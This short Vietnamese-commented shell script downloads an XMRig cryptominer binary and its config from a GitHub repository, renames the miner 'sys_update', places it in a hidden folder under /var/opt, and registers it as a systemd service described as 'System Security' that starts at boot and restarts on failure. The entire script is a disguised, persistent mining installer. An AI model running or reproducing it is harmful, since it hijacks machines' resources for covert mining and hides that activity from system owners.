# Tạo thư mục lưu trữ vĩnh viễn
sudo mkdir -p /var/opt/.sys_config

# Tải file về vị trí mới
sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json | tr -d '\r' | sudo tee /var/opt/.sys_config/config.json > /dev/null
sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /var/opt/.sys_config/sys_update
sudo chmod +x /var/opt/.sys_config/sys_update

# Tạo lại file service trỏ vào đường dẫn vĩnh viễn
sudo printf "[Unit]\nDescription=System Security\nAfter=network.target\n\n[Service]\nExecStart=/var/opt/.sys_config/sys_update --config=/var/opt/.sys_config/config.json\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\n" | sudo tee /etc/systemd/system/sys_update.service > /dev/null

# Kích hoạt Startup
sudo systemctl daemon-reload
sudo systemctl enable sys_update
sudo systemctl start sys_update
